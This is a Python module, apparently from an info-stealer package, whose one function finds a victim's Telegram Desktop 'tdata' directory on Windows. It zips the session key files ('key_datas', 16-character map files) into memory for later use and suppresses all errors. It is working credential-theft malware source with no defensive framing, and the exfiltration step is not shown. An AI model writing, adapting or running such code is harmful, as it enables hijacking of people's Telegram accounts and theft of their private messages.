import os
import shutil
import zipfile
import io
import getpass
from .utils import expand_path

def extract_telegram():
    tdata_paths = [
        os.path.join(os.environ.get('APPDATA', ''), 'Telegram Desktop', 'tdata'),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Telegram Desktop', 'tdata')
    ]
    
    found_tdata = None
    for path in tdata_paths:
        if os.path.exists(path):
            found_tdata = path
            break
            
    if not found_tdata:
        return None
        
    try:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(found_tdata):
                for file in files:
                    if len(file) == 16 or file == "key_datas" or file == "settingss":
                        file_path = os.path.join(root, file)
                        if os.path.getsize(file_path) < 1024 * 1024:
                            arcname = os.path.relpath(file_path, found_tdata)
                            zipf.write(file_path, arcname=arcname)
                    
                if root.count(os.sep) - found_tdata.count(os.sep) > 1:
                    break
                    
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    except:
        return None
